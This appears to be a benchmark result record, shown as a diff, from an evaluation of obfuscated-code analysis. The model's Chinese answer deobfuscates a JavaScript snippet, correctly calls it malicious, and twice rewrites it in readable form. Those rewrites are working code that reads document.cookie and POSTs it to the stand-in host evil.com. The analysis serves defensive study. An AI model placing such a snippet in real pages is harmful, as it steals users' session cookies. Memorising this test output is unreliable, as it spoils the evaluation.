@@ -1,0 +1,18 @@
+{
+  "task_id": "task_04_deobfuscation",
+  "dimension": "混淆代码分析",
+  "sub_label": null,
+  "model_id": "gpt",
+  "model_name": "gpt-5.5",
+  "api_model": "gpt-5.5",
+  "run_index": 0,
+  "timestamp": "2026-07-06T15:52:19.481246",
+  "prompt_hash": "847a5556",
+  "content": "下面逐项分析。\n\n## 1. 这段代码的实际功能是什么\n\n这段 JavaScript 是经过简单混淆的代码。\n\n原数组解码后是：\n\n```javascript\n[\n  'cookie',\n  'fetch',\n  'https://evil.com/c',\n  'POST',\n  'stringify'\n]\n```\n\n因此代码实际执行的是：\n\n1. 读取当前页面的 Cookie：\n\n```javascript\ndocument.cookie\n```\n\n2. 获取 `window.fetch` 方法：\n\n```javascript\nwindow.fetch\n```\n\n3. 向以下地址发送一个 `POST` 请求：\n\n```text\nhttps://evil.com/c\n```\n\n4. 请求体内容是 JSON 字符串，格式如下：\n\n```json\n{\n  \"d\": \"当前页面的 cookie 内容\"\n}\n```\n\n也就是说，它会把当前网页中 JavaScript 可访问的 Cookie 发送到远程服务器。\n\n---\n\n## 2. 是否有恶意行为\n\n是的，这段代码具有明显的恶意行为。\n\n它的行为属于：\n\n- 窃取 Cookie\n- 向外部服务器传输敏感信息\n- 可能用于盗取登录态或会话信息\n\n尤其是如果 Cookie 中包含会话 ID、认证 Token 等信息，攻击者可能利用这些信息冒充用户。\n\n不过需要注意：\n\n- 带有 `HttpOnly` 属性的 Cookie 无法通过 `document.cookie` 读取\n- 但普通 Cookie、未受保护的会话信息仍然可能被泄露\n- 这类代码常见于 XSS 攻击、恶意广告脚本、被植入的后门代码中\n\n结论：这是恶意的 Cookie 外传代码。\n\n---\n\n## 3. 用可读的方式重写它\n\n等价的可读版本如下：\n\n```javascript\n(function () {\n  const cookies = document.cookie;\n\n  fetch('https://evil.com/c', {\n    method: 'POST',\n    body: JSON.stringify({\n      d: cookies\n    })\n  });\n})();\n```\n\n也可以写得更直观一些：\n\n```javascript\nconst stolenCookies = document.cookie;\n\nconst data = {\n  d: stolenCookies\n};\n\nfetch('https://evil.com/c', {\n  method: 'POST',\n  body: JSON.stringify(data)\n});\n```\n\n这段可读代码的含义就是：\n\n```text\n读取当前网页的 Cookie，并通过 POST 请求发送到 https://evil.com/c\n```\n\n因此，如果在网页中发现类似代码，应立即移除，并检查是否存在 XSS、供应链污染或第三方脚本被篡改的问题。",
+  "prompt_tokens": 296,
+  "completion_tokens": 1053,
+  "total_tokens": 1349,
+  "elapsed_seconds": 39.15,
+  "finish_reason": "stop",
+  "status": "ok"
+}
